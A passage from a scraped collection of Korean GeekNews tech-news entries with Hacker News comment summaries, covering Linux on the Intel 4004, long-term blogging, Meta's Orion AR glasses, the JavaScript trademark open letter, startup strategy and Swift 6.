          + 빠른 성공을 거둘 수 있지만, 대규모 시장으로 확장하기 어려움
     * Candy Japan을 통해 ""build in public""을 경험한 후, 긍정적인 점과 부정적인 점을 발견함
          + 긍정적인 점: 고객을 직접 유치하고 SEO에 도움이 되는 백링크를 얻을 수 있음
          + 부정적인 점: 프로젝트를 복제하려는 사람들이 생기고, 자신의 정체성이 프로젝트에 묶이게 됨
     * 숫자를 공유하지 않고 ""build in public""을 실천함
          + 스크린샷을 공유하고 피드백을 요청하며, 디자인 과정에 동료 빌더들을 참여시킴
          + 올바른 사람들과의 대화를 유도하고 친구를 사귈 수 있는 좋은 방법임
     * ""build in public""과 indie hackers 커뮤니티를 발견하고 참여했으나, 실망함
          + 많은 사람들이 저품질의 질문을 올리고, 반복적인 콘텐츠를 생성함
          + 정치적 게시물에 실망하여 결국 커뮤니티를 떠남
     * ""build in public""은 마케팅과 자기 홍보의 한 형태임
          + 제품 출시에서 기술보다 청중을 구축하는 것이 더 어려움
          + ""build in public""은 주목을 받고 청중을 얻는 가장 쉬운 방법 중 하나임
     * ""build in public""이 클라우트 추구로 변질되었다고 생각함
          + 프로젝트와 기술적 도전에만 집중하는 것이 중요함
          + ""build in public""을 도덕적 의무로 여기는 것이 바람직함
     * 투명성은 가치가 있지만, 많은 사람들이 과도하게 공유함
          + 수익보다는 전략과 도전 과제를 공유하는 것이 더 유용함
     * Canny를 통해 ""build in public""이 초기 마케팅 채널로 유용했음을 경험함
          + 첫 사용자와 인지도를 얻기 어려운 초기 단계에서 도움이 됨
          + 현재는 채널이 포화 상태여서 효과가 떨어질 수 있음
     * ""build in public""의 주요 목적은 주목을 끌고 커뮤니티를 구축하는 것임
          + 오픈 소스 코드와 유사하게 긍정적인 외부 효과를 창출함
          + 컨퍼런스와 네트워킹의 지속적인 형태로 유용함
     * ""build in public""은 혼자 일하면서도 외롭지 않게 느끼기 위한 방법임
          + 마케팅과 출시에도 도움이 된다면 보너스임
"
"https://news.hada.io/topic?id=16862","Linux/4004: 재미와 예술을 위한 Intel 4004에서의 Linux 부팅, 상업적 이익 없음","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Linux/4004: 재미와 예술을 위한 Intel 4004에서의 Linux 부팅, 상업적 이익 없음

시작

     * 2012년에 8비트 마이크로컨트롤러(AVR)에서 리눅스를 실행하여 최저 사양의 머신에서 리눅스를 실행하는 세계 기록을 세움
     * 2023년에 AVR보다 더 낮은 사양의 MOS 6510에서 리눅스를 부팅하는 프로젝트가 등장
     * 인텔 4004는 세계 최초의 상업용 마이크로프로세서로, 4비트 칩으로 새로운 최저 사양의 기준을 세우기 위해 이 프로젝트를 시작함

4004

     * 4004는 4비트 단위로 작동하며, 주로 계산기용으로 개발됨
     * 논리 연산이 없고, 주로 ADD와 SUB 명령어만 존재
     * 캐리 플래그를 사용한 독특한 연산 방식
     * 16개의 4비트 레지스터와 12비트 프로그램 카운터, 4단계 하드웨어 스택을 가짐
     * 최소 클럭 속도가 필요하며, 인터럽트 지원이 없음
     * 메모리 연산을 직접 수행할 수 있는 몇 가지 명령어가 존재

제어 흐름

     * 하드웨어 스택을 사용한 서브루틴 호출 및 반환
     * 조건부 점프 명령어가 존재하며, TEST 핀을 통해 외부 이벤트를 감지할 수 있음
     * 코드 페이지 개념을 사용하여 4096바이트의 코드 공간을 관리

메모리 및 I/O

     * 4004는 메모리 명령어를 직접 처리하지 않으며, 메모리 칩이 이를 처리함
     * 최대 8개의 RAM 뱅크를 지원하며, 각 뱅크는 4개의 4002 칩으로 구성됨
     * 4001은 256바이트의 ROM과 4비트 I/O 포트를 포함
     * 4265는 일반적인 I/O 장치로, 4개의 4비트 I/O 포트를 가짐

4008, 4009, 4289

     * 4008과 4009는 일반적인 메모리 칩과 인터페이스할 수 있도록 설계됨
     * 4289는 4008과 4009를 결합한 칩으로, 5V 신호 수준에서 통신 가능

메모리 사용 및 상태 니블

     * 메모리 뱅크를 선택하기 위해 DCL 명령어를 사용
     * 각 RAM 뱅크는 4개의 4002 칩으로 구성되며, 각 칩은 16개의 주소 가능한 니블과 4개의 상태 니블을 가짐

GN⁺의 정리

     * 이 프로젝트는 인텔 4004와 같은 초기 마이크로프로세서의 작동 방식을 이해하는 데 큰 도움이 됨
     * 4004의 독특한 설계와 제한된 기능을 극복하는 방법을 보여줌
     * 현대의 마이크로컨트롤러와 비교하여 초기 마이크로프로세서의 한계를 체험할 수 있는 기회를 제공
     * 비슷한 기능을 가진 프로젝트로는 MOS 6510에서 리눅스를 부팅하는 프로젝트가 있음

   원글 저자가 이번에 데프콘에서 배지 관련으로 무대에서 끌려나간 그 양반이군요. 누구 편을 들지는 않겠습니다만 그래도 실력은 진짜 대단하네요.

        Hacker News 의견

     * NetBSD가 15 MHz m68030에서 느리다고 생각했는데, 이 프로젝트는 정말 대단함
          + 80년대 후반과 90년대 초반에 컴퓨터가 영구 저장 장치, 개방형 주소 공간, MMU를 갖추기 시작하면서 현대 컴퓨팅에 도달했음
          + Amiga 3000이나 i80486 컴퓨터도 현대 컴퓨터와 동일한 기능을 수행할 수 있음
          + Dmitry가 ""기능적""이라는 정의를 얼마나 느슨하게 할 수 있는지 보여줌
     * 이 프로젝트를 이해할 수 있을 정도로 지식을 확장하고 싶음
          + ""Section 14.b & 14.c - Getting the data..."" 부분을 완전히 이해했음
          + 4년 동안 400K 파일(하루에 약 275장의 사진)을 처리했음
          + 많은 처리 능력, 저장 공간, 네트워크가 있음에도 불구하고 미디어 동기화 앱이 충돌하거나 느린 동기화 문제를 겪음
          + AirDrop이 실패하고 'Select-All' UI 기능이 부족함
     * AVR 예제를 좋아하는데, 이제 새로운 예제가 생겼음
          + 주파수와 전력 소비를 고려할 때 RF가 얼마나 나오는지 궁금함
          + ""soubroutine""이라는 단어가 오타일 가능성이 있음
     * 이 프로젝트는 저렴하지 않았음, Ebay 수집가들에게 감사함
          + LCD 대신 VFD를 선택했을 것임, 장기 컴파일 시 VFD가 손상될 수 있음
     * 놀라운 프로젝트임
          + 높은 PC 비트에서 현재 실행 중인 것을 볼 수 있음
          + P.S.: 인터넷을 통한 서버의 IPMI보다 커널을 더 빨리 로드함
     * 비디오 촬영에 9일이 걸렸음, 에뮬레이션된 초당 4시간
          + 왜 Windows 95를 사용하는지 궁금함
     * 이런 종류의 프로젝트에 노벨상이 필요함
     * 매우 흥미로운 읽을거리였음
          + 4004에 대해 조금 알고 있었지만, 그 수준의 난해함은 놀라웠음
          + 동일한 트랜지스터 수로 CPU를 만들 수 있을지 궁금해짐
          + 8비트는 프로그래밍을 훨씬 쉽게 만듦
          + 작업을 잘 문서화해줘서 감사함
     * 초기 마이크로컴퓨터에서 가상 머신(Z-machine이나 JVM)이 작동했음
          + 컴파일러 타겟으로 사용할 수 없을 때 유용했음
          + SWEET16
          + UCSD Pascal
     * ""Why MIPS?"" 섹션에서:
          + 일부는 느린 주소 지정 모드를 가지고 있음 (RISCV)
          + RISC-V 주소 지정 모드에 무엇이 문제인지 궁금함
"
"https://news.hada.io/topic?id=16933","15년 후에도 여전히 블로그를 운영하는 이유","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        15년 후에도 여전히 블로그를 운영하는 이유

왜 나는 15년 동안 블로그를 계속했는가

     * 시간이 빠르게 지나감
          + 아이들이 학교에 가고, 쥬라기 공원 30주년을 기념하며, 작은 블로그가 15년 동안 지속됨
          + 15년은 매우 긴 시간임

  블로그를 시작한 이유

     * 게임 프로토타입을 만들고 기록하기 위해 시작함
          + 큰 RTS 게임을 만들고 싶었음
          + 게임 엔진을 개발하다가 게임 엔진 함정에 빠짐
          + _The Experimental Gameplay Project_를 발견하고 7일 만에 게임 프로토타입을 만들기로 결심함

  블로그를 계속한 이유

     * 글쓰기를 즐김
          + 글쓰기가 생각을 명확히 하고 아이디어를 구체화하는 데 도움을 줌
          + 글을 공개하면 더 나은 결과물을 만들게 됨
          + 개인 프로젝트를 기록할 수 있는 장소가 됨
          + 연간 리뷰를 통해 성취감을 느끼게 됨
          + 블로그 개발 자체가 재미있는 프로젝트가 됨
          + 글쓰기가 개발자로서의 능력을 향상시킴

    외부 피드백에 의존하지 않음

     * 외부 피드백이 아닌 자신을 위해 블로그를 유지함
          + 통계를 유지하지 않음
          + 조회수를 신경 쓰지 않음

  기술 스택의 진화

     * 기술 스택을 변경하며 블로그를 유지함
          + 2008년: PHP와 Kohana Framework
          + 2009년 초: Perl과 Mojolicious
          + 2009년 7월: Jekyll로 전환
          + 2013년 7월: Hakyll로 전환
          + 2022년 8월: Rust로 전환
          + 2024년 2월: Djot 사용 시작
          + 2024년 5월: Neovim과 연결 중

  게시물의 변화와 확장

     * 게시물의 길이와 범위가 증가함
          + 초기에는 짧은 업데이트였으나, 현재는 더 긴 글을 작성함
          + 관심사가 변하면서 게시물의 주제도 변화함

    미래는 어떻게 될까?

     * 미래를 예측할 수 없지만, 블로그를 계속할 것 같음
          + 걱정하지 말고 즐기는 것이 중요함

GN⁺의 정리

     * 이 블로그는 게임 개발에서 시작하여 다양한 개인 프로젝트와 기술 스택의 변화를 기록한 15년의 여정을 담고 있음
     * 글쓰기를 통해 생각을 정리하고, 성취감을 느끼며, 개발자로서의 능력을 향상시키는 데 도움을 줌
     * 외부 피드백에 의존하지 않고 자신을 위해 블로그를 유지하는 것이 특징임
     * 블로그의 기술 스택은 여러 번 변경되었으며, 이는 블로그를 유지하는 데 중요한 역할을 함
     * 블로그의 주제와 게시물의 길이는 시간이 지남에 따라 변화하고 확장됨

        Hacker News 의견

     * ""나는 이 블로그를 나를 위해 쓰고, 다른 사람들이 읽기 위해 쓰는 것은 아니다""라는 의견
          + 옛날 인터넷 창작자의 태도를 반영함
          + 콘텐츠를 만드는 것은 주로 자신의 즐거움과 창의적 발산을 위한 것임
          + 젊은 세대는 콘텐츠 창작을 다르게 봄
          + 광고가 콘텐츠로 위장된 것에 대해 논쟁을 벌임
          + 콘텐츠 창작을 수익화하는 것은 이해하지만, 그것이 유일한 목표로 여겨지는 것은 문제임
          + 유튜브 초기에는 이런 현상이 없었음
          + 블로그를 20년 동안 유지해옴
     * 블로그를 통해 얻은 혜택을 공유하는 것이 중요함
          + Playwright 자동화를 이용한 파일 드래그 앤 드롭 시뮬레이션에 대한 짧은 글이 많은 조회수를 기록함
          + 개발자들에게 배운 것을 공유하도록 권장함
          + 다양한 목소리를 가진 사람들이 필요함
     * 블로그는 자기 자신을 위한 것이어야 함
          + 내적 동기가 중요함
          + ""누구를 위해 쓸 것인가""보다는 ""무엇을 쓰고 싶은가""를 고민해야 함
     * 블로그는 다양한 목적으로 사용될 수 있음
          + 기술 스택에 너무 집착하지 말아야 함
          + 블로그는 자신의 생각을 정리하고 반영할 수 있는 공간임
     * 블로그는 글쓰기 능력을 향상시킴
          + 글쓰기는 개발자로서 중요한 능력임
          + 블로그 글이 점점 길어지고 야심차게 변함
     * 블로그를 오래 유지해온 경험 공유
          + 블로그를 통해 기억을 되새기고 반복적으로 답변할 수 있는 URL을 제공함
          + 단순한 텍스트로 작성하고 GitHub Pages를 사용함
     * 블로그에 통계를 추가하면 동기 부여가 떨어질 수 있음
          + 통계에 집착하지 말고 자기 자신을 위해 써야 함
     * 블로그에 ""랜덤 포스트 열기"" 버튼을 추가하면 장기적으로 더 즐거운 경험을 제공함
     * 블로그를 15년 동안 유지해온 경험 공유
          + 최근에는 새로운 글을 자주 쓰지 않음
     * 블로그는 자기 자신을 위한 것이며, 다른 사람들에게도 추천함
          + 블로그는 영혼에 좋은 활동임
"
"https://news.hada.io/topic?id=16930","Meta 의 Orion 공개 - 최초의 진정한 증강 현실 안경","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Meta 의 Orion 공개 - 최초의 진정한 증강 현실 안경

     * 다섯 해 전, 우리는 AR 안경을 개발 중임을 세상에 알림
     * 사람들은 정보의 세계와 물리적 세계 사이에서 선택할 필요가 없음을 강조함
     * 오늘, 우리는 가장 진보된 AR 안경인 Orion을 공개함
     * Orion은 물리적 세계와 가상 세계를 연결하여 사람들을 중심에 두고 더 현존하고 연결되며 권한을 부여받을 수 있게 함

  왜 증강 현실 안경인가?

     * AR 안경이 인간 중심 컴퓨팅의 다음 도약을 여는 세 가지 주요 이유
          + 스마트폰 화면의 한계를 벗어난 디지털 경험을 가능하게 함
          + 물리적 세계를 캔버스로 사용하여 2D 및 3D 콘텐츠와 경험을 어디에나 배치할 수 있음
          + 주변 세계를 감지하고 이해할 수 있는 컨텍스트 AI를 통합하여 필요를 예측하고 능동적으로 대응함
          + 가볍고 실내외 모두에서 사용하기 좋으며, 사람들의 얼굴, 눈, 표정을 볼 수 있게 함

  스마트 안경의 진화

     * Ray-Ban Meta 안경은 물리적 세계에서 디지털 생활의 중요한 부분에 손쉽게 접근할 수 있는 힘을 보여줌
     * AI 비서와 대화하고, 친구와 연결하고, 중요한 순간을 포착할 수 있음
     * XR 산업은 큰 홀로그램 디스플레이와 개인화된 AI 지원을 결합한 진정한 AR 안경을 꿈꿔옴
     * Orion은 이 도전에 부응함

  비할 데 없는 형태의 획기적인 AR 디스플레이

     * VR 및 MR 헤드셋이 제공하는 공간 경험을 소형화하여 가벼운 스타일리시한 안경에 담기 위해 수년간 노력함
     * 형태를 완성하고, 홀로그램 디스플레이를 제공하며, 매력적인 AR 경험을 개발하고, 새로운 인간-컴퓨터 상호작용(HCI) 패러다임을 창출함
     * Orion은 가장 작은 AR 안경 형태에서 가장 큰 시야를 제공함
     * 이 시야는 멀티태스킹 창, 대형 화면 엔터테인먼트, 실물 크기의 홀로그램 등 몰입형 사용 사례를 가능하게 함
     * Orion은 투명 렌즈를 갖춘 안경으로, 다른 사람의 눈과 표정을 볼 수 있어 주변 사람들과 경험을 공유할 수 있음

  증강 현실 경험

     * Orion의 스마트 비서 Meta AI는 물리적 세계를 이해하고 유용한 시각화를 제공함
     * 냉장고를 열고 안에 있는 재료로 레시피를 요청하거나, 설거지를 하면서 디지털 가족 캘린더를 조정하며 친구와 영상 통화를 할 수 있음
     * 실시간으로 친구 및 가족과 영상 통화를 하고, WhatsApp 및 Messenger를 통해 메시지를 주고받을 수 있음
     * Orion을 통해 새로운 몰입형 소셜 경험을 구축하고 있음

  목적 있는 제품 프로토타입

     * Orion은 소비자에게 제공되지 않지만, 연구 프로토타입이 아님
     * 내부 개발에 집중하여 기술의 경계를 계속 확장하고 있음

  다음 단계

     * Connect에서 Orion 제품 프로토타입에 대한 접근을 Meta 직원과 선택된 외부 청중에게 열어 개발팀이 학습하고 개선할 수 있도록 함
     * AR 디스플레이 품질 조정, 형태 최적화, 대규모 생산을 통해 더 저렴하게 만드는 것에 집중함
     * 향후 몇 년 동안 R&D 노력을 기반으로 한 새로운 장치를 기대할 수 있음

GN⁺의 정리

     * Orion은 물리적 세계와 디지털 세계를 연결하는 진보된 AR 안경임
     * Meta AI와 같은 스마트 비서 기능을 통해 일상 생활에서 유용한 시각화와 상호작용을 제공함
     * Ray-Ban Meta 안경과 같은 기존 제품과 비교하여 더 큰 시야와 몰입형 경험을 제공함
     * AR 기술의 미래 가능성을 보여주며, 향후 몇 년 동안 더 많은 혁신을 기대할 수 있음

        Hacker News 의견

     * Nice hardware: 하드웨어가 수영 고글 크기로 작아졌음
          + Facebook이 원하는 것은 항상 화면을 보는 것임
          + GPS가 있지만 꺼져 있어서 Pokemon Go 같은 기능은 없음
          + 어두운 색을 그릴 수 없고, 밝은 오버레이로 대체함
          + 밝은 낮에 작동할지 의문임
     * Metaverse 회의론자: Metaverse 프로젝트에 회의적이었음
          + 디스플레이와 배터리 수명이 괜찮다면 흥미로울 것임
          + 실리콘 카바이드 디스플레이 기판에 대해 잘 모르지만, Meta의 전문가들이 비용을 수용 가능하게 만들 것이라고 생각함
          + 틀렸다면 기쁠 것임, 잘 작동하면 멋질 것임
     * The Verge 기사: The Verge의 실습 기사 추천
          + 무선 컴퓨트 팩, 70도 FOV, 텍스트 읽을 수 있는 해상도
          + 손 제스처를 감지하는 손목 밴드가 다른 제품에 사용될 것임
     * DefCon에서 만난 여성: 아이들의 생체 데이터를 이용해 광고를 최적화하는 것에 대한 우려
          + 사람들이 이 문제를 걱정하는지 궁금함
     * Ray-Ban: Ray-Ban의 강조는 '일상 생활에서 유용한' 것보다는 '베블렌'을 목표로 함
          + 나쁜 전략은 아니지만, 저렴한 제품에 대한 경고 신호임
     * 프로토타입 외관: 크고 우스꽝스럽게 생겼음
          + 80년대 NHS 안경이나 Thunderbird 쇼의 Brains를 연상시킴
     * 이상한 미션 스테이트먼트: 정보의 세계와 물리적 세계 사이에서 선택할 필요가 없다는 미션 스테이트먼트가 이상함
     * Vision Pro와 비교: 여전히 크지만 Vision Pro 안경보다 장시간 착용하기 나을 것임
          + Apple이 이 경로를 조사했지만 비용 문제로 포기했을 것임
     * Apple의 AR 글래스 지연: Apple이 이 분야에서 뒤처져 있음
          + 1990년대 영화에서 AR 글래스가 개념화되었고, 11년 전 Google Glass가 나왔음
          + Apple은 매년 새로운 기능이 거의 없는 '신선한' 폰을 출시하려고 함
     * Meta 논의: Meta 논의가 HN에서 금기시되지만 이해하지 못함
          + 링크가 115MB이며, 30MB GIF를 로드함
          + React를 만든 회사에서 이런 일이 발생함
"
"https://news.hada.io/topic?id=16896","OpenZFS 마스터 브랜치에 Direct IO 기능 병합","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    OpenZFS 마스터 브랜치에 Direct IO 기능 병합

   오픈소스 파일시스템 중에 하나인 OpenZFS에 Direct IO 기능이 master branch에 병합되었습니다.

   OpenZFS에서 꾸준히 제기되었던 문제 중에 ARC(Adaptive Replacement Cache)를 사용함에 따라 성능 저하가 발생했던 문제를 Direct IO 기능이 병합됨에 따라 해결될 수 있지않나라는 기대를 할 수 있습니다.

   사용 저하 사례는 아래와 같습니다.
     * https://github.com/openzfs/zfs/issues/8381

   위 이슈의 내용을 요약하면, Zpool을 사용하는 NVMe 사용 시, 메모리 복사 과정에서 오버헤드가 발생했다는 내용입니다.
     * https://github.com/openzfs/zfs/issues/8381#issuecomment-528123746
     * https://github.com/openzfs/zfs/issues/8381#issuecomment-528329142

   위 두개의 코멘트가 맥락을 이해하는데 도움이 될 것입니다.
"
"https://news.hada.io/topic?id=16861","Show GN: react-native-icons-builder - React Native에서 `react-icons`의 아이콘 사용하기  ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                              Show GN: react-native-icons-builder - React Native에서 `react-icons`의 아이콘 사용하기

   react-icons에 존재하는 아이콘 중 필요한 아이콘만 프로젝트 내에 생성합니다.

동기

     * react-native에서는 react-icons를 사용할 수 없습니다.
     * Metro는 Tree Shaking을 지원하지 않기에 모든 아이콘 세트를 제공한다면 번들 사이즈가 커질 수 있습니다.
"
"https://news.hada.io/topic?id=16815","Oracle, 이제 JavaScript를 놓아줘야 할 때입니다.","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Oracle, 이제 JavaScript를 놓아줘야 할 때입니다.

     * Oracle은 JavaScript의 Trade Mark(상표권)을 소유하고 있음에도 그에 적합한 제품이나 서비스를 제공하지 않음
          + JavaScript는 세계에서 가장 인기 있는 프로그래밍 언어로, 웹사이트를 구동함
          + JavaScript 상표권은 Oracle이 소유하고 있으나, 수백만 명의 사용자는 이 사실을 모름
          + 트레이드마크의 소유권과 실제 사용의 불일치로 인해 혼란과 문제가 발생함
     * Oracle의 JavaScript 상표권 보유는 법적으로 상표권 포기에 해당
          + 상표권 포기의 법적 정의에 따르면, 사용을 중단하고 재개할 의사가 없거나, 상표권이 일반 명칭이 되면 포기로 간주됨
          + JavaScript의 경우, 두 조건 모두 충족함

Netscape, Sun, Oracle의 역사

     * 1995년 Netscape와 Sun Microsystems의 파트너십을 통해 JavaScript가 탄생함
     * JavaScript는 Brendan Eich가 10일 만에 개발한 동적 프로그래밍 언어
     * 2009년 Oracle이 Sun Microsystems를 인수하며 JavaScript 상표권도 함께 인수함

상표권 포기의 근거

     * Oracle은 JavaScript 마크를 사용한 제품을 개발한 적이 없음
     * 2019년 USPTO에 제출된 자료에서는 Node.js와 Oracle JET를 언급하지만, 이는 Oracle의 제품이 아님
     * GraalVM은 JavaScript를 실행할 수 있지만, 주요 JavaScript 엔진으로 간주되지 않음
     * Oracle의 JET와 GraalVM에서의 JavaScript 사용은 상표권의 진정한 사용을 반영하지 않음

일반 용어로의 변화

     * 1996년 Netscape는 JavaScript를 표준화하기 위해 ECMA 인터내셔널 회의를 소집했지만, Sun(현 Oracle)이 상표권을 포기하지 않아 ECMAScript라는 이름을 사용하기로 함
     * TC39 위원회는 ECMA-262, 즉 JavaScript 사양을 발행함
     * Oracle의 JavaScript 상표권 소유는 혼란만 야기함
     * JavaScript라는 용어는 전 세계 수백만 개발자, 기업, 조직에서 자유롭게 사용되고 있음

상표권 해제 촉구

     * JavaScript는 사용되지 않거나 일반 명칭이 되었으므로 법적으로 상표권 포기에 해당
     * Oracle에게 상표권을 공개 도메인에 풀어줄 것을 촉구함
          + 오라클은 상표권을 실질적으로 사용하지 않으므로, 상표권을 유지할 이유가 없음
          + 오라클이 자발적으로 상표권을 공개하지 않을 경우, USPTO에 취소 청원을 제출할 계획

독자에게

     * 이 공개 서한에 동의한다면 서명해 주기를 바람
     * 25명 이상의 직원이 있는 조직인 경우 companies@javascript.tm로 이메일 보내기 바람
     * 상표법 경험이 있는 변호사의 pro bono 지원을 구하고 있음

서명

     * Ryan Dahl - creator of Node.js
     * Brendan Eich - creator of JavaScript
     * Michael Ficarra - editor of the JavaScript spec
     * Rich Harris - creator of Svelte
     * Isaac Z. Schlueter - creator of npm
     * Feross Aboukhadijeh - CEO of Socket
     * James M Snell - member of Node.js TSC
     * Wes Bos - host of Syntax.fm
     * Scott Tolinski - host of Syntax.fm
     * Shu-yu Guo - editor of the JavaScript spec
     * Jordan Harband - emeritus editor of the JavaScript spec
     * 그리고 자바스크립트 커뮤티니의 4000+명 멤버들

   진짜 굳이 Java와 Script를 이름에 사용해야할 이유가 있나 싶네요.

   대부분의 사람들이 javascript 란 단어는 적절하지 않다고 생각하는것 같음. 그럼 이런건 어떨까. funscript(FS), sexyscript(SS), youscript(YS), shitscript(also SS), nimirulscript(NMRS), nonsensescript(NSS), hackscript(HS), wthscript(WTHS), hellscript(HS), poopscript(PS) 등등 너무나 많은 후보가 있음.

   ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 확실히 java는 떼는 게 맞는 것 같네요.

        Hacker News 의견

     * ""JavaScript""라는 이름이 어리석다고 생각함. ""JS""로 부르는 것이 더 나음
          + ""JavaScript""는 1900년대의 잘못된 마케팅 결정의 잔재임
          + ECMA-262의 다음 판에서 ""JavaScript""를 ""JS""로 부르도록 권장해야 함
     * Oracle은 도덕적 설득에 면역이 있는 회사임
          + Google을 Java 재구현으로 고소한 회사임
          + Oracle이 무언가를 하게 하려면 많은 돈이나 강력한 법적 위협이 필요함
     * ""Java"" 부분 때문에 이름을 고수하고 있음
          + Eclipse org가 ""Jakarta"" EE로 이름을 바꿀 때도 어려움을 겪었음
          + ""javax"" 패키지 이름을 포기하지 않음
     * Oracle 경영진을 의인화하는 함정에 빠지지 말아야 함
     * Oracle이 실제로 방어하는지 의문임
          + 상표는 실제로 사용해야 한다는 규칙이 있음
          + VELCRO의 노래가 이를 설명함
     * 많은 사람들이 상표를 침해하는 이름을 사용함
          + ""Aspirin"", ""elevators"", ""laundromat"" 등이 예시임
          + ""App Store""도 Apple이 상표로 등록함
     * 상표가 이미 포기되었다면 왜 편지가 필요한지 의문임
     * Oracle의 상업적 사용 주장에 대한 링크가 있음
          + node.js 다운로드 페이지와 Oracle Javascript Extension Toolkit이 있음
          + 약하지만 논쟁의 여지가 있음
     * 혼란과 혼란을 일으킨다는 주장에 대해 즉각적인 이익을 보지 못함
     * 처음에는 인터넷 불평이라고 생각했지만, 편지의 서명자들을 보고 놀람

   오라클이 Javascript 놓아주면 Java 브랜딩에 금이 가기 때문에 귓등도 쳐 안들을 겁니다.
"
"https://news.hada.io/topic?id=16855","어떻게 스타트업이 기존 기업들을 이길 수 있는가(How startups beat incumbents)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        어떻게 스타트업이 기존 기업들을 이길 수 있는가(How startups beat incumbents)

   2010년에 런칭해 2024년 매출이 4억 달러에 달하는 워드프레스 호스팅 업체 WP Engine의 창업자가 쓴 ”어떻게 스타트업이 기존 기업들을 이길 수 있는가(How startups beat incumbents)글을 한글로 번역했습니다.

   심사역들이 자주 하는 질문으로 “어떻게 시장 선도 업체를 이길 수 있을까요?”가 있습니다. 혹은 더 나쁜 버전으로는, “국내 대표 IT 플랫폼인 N, K사가 똑같은 것을 하면 어떻게 대응하나요” 등의 질문을, 스타트업 입장에서 고민하면 아래와 같은 답을 생각해볼 수 있겠습니다.

   프릭스 역시 시장 선도 업체와의 경쟁이 있고, 심지어는 구글이 문서 도구에 무료로 도입한 전자서명에 대응하기 위해 경쟁력을 키우고 있습니다.

   큰 시장에는 명확한 틈새와 각자 다른 고객 세그먼트가 있고, 많은 스타트업이 질문하기는 쉽지만 답하기는 어려운 위 질문에 자신만의 니치와 강점을 살려서 좋은 답을 만들기를 바라는 마음에 공유합니다.

   스타트업이 기존 기업을 이기는 방법:
   모든 대기업의 장점은 반대로 이용하기 좋은 약점을 낳음: 규모가 커짐에 따라 업무의 난이도가 기하급수적으로 높아지기 때문. 고객을 한번에 많이 확보할 수는 있지만, 기존 제품을 바꾸기 매우 어려움.
    1. 정량화할 수 없는 위험 감수
       대부분의 ""정량화된 위험 - ROI 분석""은 틀리기 마련이고, ROI 분석은 진짜 좋은 아이디어를 거부하거나 분석의 난이도가 높은 큰 베팅을 하지 못하게 막으면서 리스크 관리의 측면에서 (분모를 줄이기 위해) 위험을 지려고 하지 않음
    2. 수익성 있는 틈새 시장 공략
       기존 기업은 수익률에 실질적인 규모의 영향을 미쳐야 해서 (통상 현재 매출의 10%) 작아 보이는 사업은 건드리지 않음. 다만 스타트업은 두 명이 100만 달러만 벌어도 성공이고, 대기업이 공략할 여력이 없는 니치와 ICP에 집중할 수 있음. 오히려 기존 기업이 클수록 스타트업은 경쟁에 대해 걱정할 필요가 없음
    3. 확장할 수 없는, 즐겁고 가치 있는 일을 하기
       확장성을 고려할 필요가 없는 빠른 이터레이션: 몇 주만에 빠르게 무언가를 출시하고 반복할 수 있음. 대기업은 “단기적으로” “많은 양의” 매출을 필요로 하며, 6년동안 ARR 0에서 2천만 달러가 되는 식의 형태는 결코 원하지 않음. 한편 스타트업이 6년동안 매출 2천만 달러를 벌었다면 매우 빠른 성과
    4. 탁월한 고객 서비스
       창업자가 고객 서비스 티켓을 쳐내는 것은 압도적인 고객 경험임. 오히려 기술 지원 담당자가 수천 명이라면 이런 서비스를 받을 수 없고, 훌륭한 고객 지원은 고객의 사랑과 충성도를 키울 수 있음. 문제가 발생해도 용서하고, 큰 장애가 있어도 응원받을 수 있음.
    5. 새로운 기술 활용
       기술 자체가 경쟁 우위를 창출하기도 하며, 현재 AI의 경우처럼 이전에는 불가능했던 일이 가능해지기도 함. 스타트업은 안정성이 떨어지는 기술을 활용하더라도 기존 대비 훨씬 효율적이라면 갈아엎는 데 시간을 써도 의미가 있음.
    6. 개성을 보여주기
       대기업의 표준화, 무던함은 강점이기도 하지만 스타트업의 개성, 진심 및 강한 호불호는 초기 고객 베이스를 만드는 계기가 되기도 함. 얼리어답터를 제대로 확보하려면 강한 개성을 갖추는 것이 나음
    7. 제로섬이 아닌 일을 하는 것
       기존 마케팅 채널 중 제로섬(애드워즈, SEO, 퍼포먼스 마케팅, 제휴)이 아닌 Positive-sum 게임(소셜 미디어, 뉴스레터, 앱 마켓, 공동 프로모션)를 하면 기존 기업이 막을 수 없음
    8. 전반적으로 더 나쁘지만 대부분의 측면에서 수용 가능한 수준의 제품
       대기업에게는 필수적인 극도로 낮은 다운타임과 보안, 품질, 확장성 등 사람들이 덜 중요하게 생각하지만 갖추기에는 매우 비싼 요소를 스타트업은 적당한 수준에서 타협하고, 대신 ICP가 중요하게 생각하는 영역에서 압도적으로 나은 제품을 만들 수 있음
    9. 이익 중심점에 저비용으로 맞서기
       기존 기업의 정해진 BM과 정적인 코드 베이스 및 브랜드에 대해 민첩한 움직임과 낮은 가격으로 공격이 가능함. 기존 기업은 고가치 사용자에게 집중하게 하고, 스타트업은 시장 점유율을 빠르게 빼앗을 수 있음

   덧: 계약관리 서비스인 프릭스가 어떻게 위 전략들을 사용하는지 궁금하시다면, 저희 서비스 소개서를 확인해 주세요. https://featpaper.com/viewer/KjK1noHkrT00

   https://thestartupbible.com/2023/04/… 글과 https://hwang.sh/startup-vs-giants 블로그 글도 같이 읽어볼만합니다.

     대기업에게는 필수적인 극도로 낮은 업타임

   문맥 상 다운타임이 맞을 것 같네요

   아이코, 바로잡아 주셔서 감사합니다!
"
"https://news.hada.io/topic?id=16818","Swift 6 출시","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Swift 6 출시

     * 이 릴리스는 Swift를 더 많은 플랫폼과 도메인으로 확장함
     * Swift는 앱 개발 언어로 잘 알려져 있지만, 라이브러리, 인터넷 규모의 서비스, 성능이 중요한 코드 등 다양한 용도로도 훌륭함
     * Swift 6는 새로운 저수준 프로그래밍 기능, 임베디드 Swift 언어 서브셋, 확장된 Linux 및 Windows 지원, 새로운 크로스 플랫폼 API 등을 통해 더 확장됨

  언어와 표준 라이브러리

    동시성

     * Swift 6는 새로운 언어 모드를 통해 동시성 코드에서 데이터 경합을 방지하는 안전성을 제공함.
     * -strict-concurrency=complete 컴파일러 플래그를 통해 데이터 경합 안전성 경고를 제공함.
     * 새로운 동기화 라이브러리로 저수준 동시성 API를 포함함.

    Typed throws

